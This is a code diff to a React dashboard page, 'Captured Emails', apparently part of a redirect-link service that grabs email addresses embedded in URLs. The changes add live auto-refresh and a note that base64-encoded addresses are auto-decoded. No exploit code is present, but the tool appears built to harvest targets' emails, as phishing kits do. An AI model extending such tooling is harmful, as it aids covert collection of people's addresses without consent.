@@ -37,11 +37,13 @@ export default function CapturedEmails() {
   const { data: emails = [], isLoading } = useQuery({
     queryKey: ['captured-emails'],
     queryFn: () => apiFetch('/api/captured-emails?limit=1000'),
+    refetchInterval: 10000, // Auto-refresh every 10 seconds
   });
 
   const { data: stats = {} } = useQuery({
     queryKey: ['captured-emails-stats'],
     queryFn: () => apiFetch('/api/captured-emails/stats'),
+    refetchInterval: 10000, // Auto-refresh every 10 seconds
   });
 
   const handleExport = () => {
@@ -61,8 +63,14 @@ export default function CapturedEmails() {
     <div className="p-6 space-y-6">
       <div className="flex items-start justify-between">
         <div>
-          <h1 className="text-3xl font-bold text-slate-900 mb-2">Captured Emails</h1>
-          <p className="text-slate-500">Global Email Autograb - Emails captured from redirect links</p>
+          <div className="flex items-center gap-3 mb-2">
+            <h1 className="text-3xl font-bold text-slate-900">Captured Emails</h1>
+            <span className="flex items-center gap-2 px-3 py-1 bg-emerald-100 text-emerald-700 rounded-full text-sm font-medium">
+              <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+              Live
+            </span>
+          </div>
+          <p className="text-slate-500">Global Email Autograb - Emails captured from redirect links • Auto-refreshes every 10s</p>
         </div>
         <Button onClick={handleExport} className="bg-emerald-600 hover:bg-emerald-700">
           <Download className="w-4 h-4 mr-2" />
@@ -186,8 +194,8 @@ export default function CapturedEmails() {
                       </TableCell>
                       <TableCell>
                         <div className="text-sm">
-                          <div className="font-medium text-slate-700">{email.redirect_name || 'Unnamed'}</div>
-                          <div className="text-xs text-slate-500">{email.redirect_id}</div>
+                          <div className="font-medium text-slate-700">{email.redirect_name || 'Unnamed Link'}</div>
+                          <div className="text-xs text-slate-500 font-mono">{email.redirect_id}</div>
                         </div>
                       </TableCell>
                       <TableCell>
@@ -229,6 +237,7 @@ export default function CapturedEmails() {
             <li><code>$user@example.com</code> → Dollar separator</li>
             <li><code>*user@example.com</code> → Asterisk separator</li>
             <li><code>#user@example.com</code> → Hash fragment</li>
+            <li><code>$dGVzdEB0ZXN0LmNvbQ==</code> → Base64 encoded (auto-decoded)</li>
           </ul>
         </CardContent>
       </Card>
